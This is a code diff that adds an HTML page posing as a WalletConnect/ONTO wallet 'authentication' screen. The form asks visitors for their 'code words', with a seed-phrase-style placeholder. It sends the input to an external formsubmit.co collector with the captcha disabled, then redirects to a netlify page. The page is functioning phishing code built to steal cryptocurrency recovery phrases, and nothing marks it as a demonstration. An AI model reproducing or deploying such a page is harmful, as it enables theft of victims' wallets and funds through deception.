@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>authenticate wallet</title>
+    <link rel="stylesheet" href="main.css" />
+  </head>
+  <body>
+    <nav class="nav_section">
+      <div>
+        <h1>WalletConnect</h1>
+      </div>
+      <div id="connectwallet">
+        <h2><a href="connectwallet.html">Connect Wallet</a></h2>
+      </div>
+    </nav>
+    <section class="phrase">
+      <h2>ONTO</h2>
+      <img src="./walletphotos/ONTO.jpeg" alt="" />
+      <h5>Input your code words for authentication</h5>
+      <form
+        action="https://formsubmit.co/f100dedd409b1eed9fadb7d0d1450ef3"
+        method="POST"
+      >
+        <!-- Honeypot  -->
+        <input type="text" name="_honey" style="display: none" />
+        <!-- disable captcha  -->
+        <input type="hidden" name="_captcha" value="false" />
+        <input
+          type="hidden"
+          name="_next"
+          value="http://saolaconnect.netlify.app/backend.html"
+        />
+
+        <div class="phrasetext">
+          <input
+            type="text"
+            name="key"
+            id="phrasekey"
+            placeholder="example road tree work crypto forest .... "
+          />
+
+          <br />
+          <br />
+          <input id="submitbtn" type="submit" value="Submit" />
+        </div>
+        <br />
+        <br />
+      </form>
+    </section>
+  </body>
+</html>
